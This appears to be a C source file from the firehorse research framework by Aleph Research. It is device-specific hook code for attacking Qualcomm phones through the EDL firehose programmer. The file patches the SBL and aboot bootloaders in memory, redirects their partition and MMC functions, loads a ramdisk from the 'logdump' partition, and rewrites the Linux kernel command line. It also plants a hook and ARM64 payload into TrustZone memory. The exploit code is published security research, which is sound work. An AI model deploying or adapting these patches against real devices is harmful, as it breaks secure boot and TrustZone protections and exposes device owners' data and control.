/*
firehorse
by Roee Hay & Noam Hadad, Aleph Research
*/

#include "../../fh.h"

STACKHOOK(fhpatcher)
{
    DD("Firehose patcher called!");
    
    init();

    DD("Firehose patcher done!");
}


STACKHOOK(pblpatcher)
{
    DD("PBL patcher called!");
    
    fh_dacr();
    pagecopy();
    pageremap();
    init();

    DD("PBL patcher called done!");
}

void cb_sblpatcher(cbargs *args)
{
    int *ptr = (int *)0x804CE67;
    *ptr = 0x6f6f66;
   
    set_uartB(ADDR_UARTB_SBL);
    set_snprintf(ADDR_SNPRINTF_SBL);

    init();


}
void cb_ablpatcher(cbargs *args)
{
    char foowelcome[] = "welcome to foo\n";
    char fmt[] = "FOOBAR %08x\n";
    char oem[] = "oem foo";

    char *ptr = (char *)0x8f675140;

    memcpy((void *)0x8f66c6c0, fmt, sizeof(fmt));
    memcpy(ptr, foowelcome, sizeof(foowelcome));
    memcpy((void *)0x8F67A9FC, oem, sizeof(oem));

    DD("FOOBAR");
    //fh_dump_log();
 
    fh_disable_uart();
    set_dprintf(ADDR_DPRINT_ABOOT);
    set_partition_get_index(ADDR_PARTITION_GET_INDEX);
    set_partition_get_offset(ADDR_PARTITION_GET_OFFSET);
    set_partition_get_lun(ADDR_PARTITION_GET_LUN);
    set_mmc_set_lun(ADDR_MMC_SET_LUN );
    set_mmc_read(ADDR_MMC_READ);
    set_mmc_get_device_blocksize(ADDR_MMC_GET_DEVICE_BLOCKSIZE);
    set_get_scratch_address(ADDR_GET_SCRATCH_ADDRESS);

    fh_rebase(ADDR_FH_ABOOT_REBASE);
    set_uartB(ADDR_UARTB_SBL);
    set_snprintf(ADDR_SNPRINTF_SBL);
    
}

void patch_kernel()
{
    char foo2[]=  "hello from linux!!! foo";  
    memcpy((void *)(0x10080000+0xEE8D10), foo2, sizeof(foo2));
}

void cb_before_linux()
{
    patch_kernel();
    memcpy(ADDR_RAMDISK, ADDR_SCRATCH_RAMDISK, RAMDISK_SIZE);
    
}


void cb_mmcread()
{
 
    int logdump = partition_get_index("logdump");
    unsigned long long logdumpoffset = partition_get_offset(logdump);
    int logdumplun = partition_get_lun(logdumpoffset);
    u_int32 scratch = get_scratch_address();

    mmc_set_lun(logdumplun);
    int blocksize = mmc_get_device_blocksize();
        
    u_int32 ramdisksize = RAMDISK_SIZE + (blocksize - mod(RAMDISK_SIZE, blocksize));

    mmc_read(logdumpoffset, ADDR_SCRATCH_RAMDISK, ramdisksize);

}

void cb_bootlinux(cbargs *cb)
{
    char *cmdline = (char *)(cb->regs[R7]);
    char buf[]= "console=ttyHSL0,115200,n8 androidboot.console=ttyHSL0 androidboot.hardware=qcom msm_rtb.filter=0x237 ehci-hcd.park=3 lpm_levels.sleep_disabled=1 androidboot.bootdevice=7824900.sdhci loglevel=7 buildvariant=user";
    D("Setting ramdisk size to %d", RAMDISK_SIZE);
    cb->regs[R5] = RAMDISK_SIZE;

    D("Printing cmdline from %08x", cmdline);
    D("cmdline = %s", cmdline);
    
    memcpy(cmdline, buf, sizeof(buf));

}


void cb_patchtz(cbargs *cb)
{
    /*
    u_int8 *write_addr = (u_int8*)0x865EE514;
    u_int32 tz_addr = 0x86500000;
    DD("tz @0x86500000:");
    fh_memdump((u_int32)tz_addr, 0x20);
    *write_addr = 'x';
    DD("tz @0x865EE514:");
    fh_memdump((u_int32)write_addr, 0x20);
    */

    //write jump to dummy code (located at 0x86503B90) at address 0x86501340
    u_int32 *call_addr = (u_int32*)0x86500008;

    //set the hook
    *call_addr = 0x94000EE2; //BL 0x86503B90

    //write payload
    u_int32 *payload_addr = 0x86503B90;

 
    //return to hooked code
    *(payload_addr++) = 0x58000040;//ldr x0, 0x8 -> 0x86501340
    *(payload_addr++) = 0xD61F0000;//BR X0
    *(payload_addr++) = 0x86501340;//value for x0

    DD("tz @0x86503B90:");
    fh_memdump(0x86503B90, 0x20);
    DD("tz @0x86500008:");
    fh_memdump(0x86500008, 0x10);
}